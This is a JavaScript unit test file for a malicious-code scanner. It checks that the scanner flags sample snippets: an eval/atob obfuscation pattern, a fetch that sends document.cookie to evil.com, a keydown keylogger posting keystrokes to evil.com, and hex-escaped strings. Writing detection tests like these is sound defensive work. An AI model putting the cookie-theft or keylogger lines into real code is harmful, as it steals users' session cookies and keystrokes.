import { MaliciousCodeScanner } from '../../../analyzers/MaliciousCodeScanner';

const scanner = new MaliciousCodeScanner();

describe('MaliciousCodeScanner', () => {
  it('returns empty array for clean code', () => {
    const code = `function greet(name) { return 'Hello, ' + name; }`;
    const findings = scanner.scan(code, 'clean.js');
    expect(findings).toHaveLength(0);
  });

  it('detects obfuscated eval+atob pattern', () => {
    const code = `eval(atob("ZG9jdW1lbnQud3JpdGUoJ2hlbGxvJyk="))`;
    const findings = scanner.scan(code, 'malicious.js');
    expect(findings.some(f => f.title.includes('Obfuscat'))).toBe(true);
  });

  it('detects cookie exfiltration', () => {
    const code = `fetch('https://evil.com/collect', { method: 'POST', body: document.cookie });`;
    const findings = scanner.scan(code, 'page.js');
    expect(findings.some(f => f.category === 'malicious')).toBe(true);
  });

  it('assigns critical severity to keylogger', () => {
    const code = `document.addEventListener('keydown', (e) => { fetch('http://evil.com/log', { body: e.key }); });`;
    const findings = scanner.scan(code, 'spyware.js');
    if (findings.length > 0) {
      expect(findings[0].severity).toBe('critical');
    }
  });

  it('returns finding with file path', () => {
    const code = `eval(atob("test"))`;
    const findings = scanner.scan(code, 'src/evil.js');
    if (findings.length > 0) {
      expect(findings[0].filePath).toBe('src/evil.js');
    }
  });

  it('detects large hex-encoded strings', () => {
    const hexString = '\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64\\x68\\x65\\x6c\\x6c\\x6f';
    const findings = scanner.scan(hexString, 'obfuscated.js');
    if (findings.length > 0) {
      expect(findings[0].title.includes('Hex') || findings[0].category === 'malicious').toBe(true);
    }
  });
});
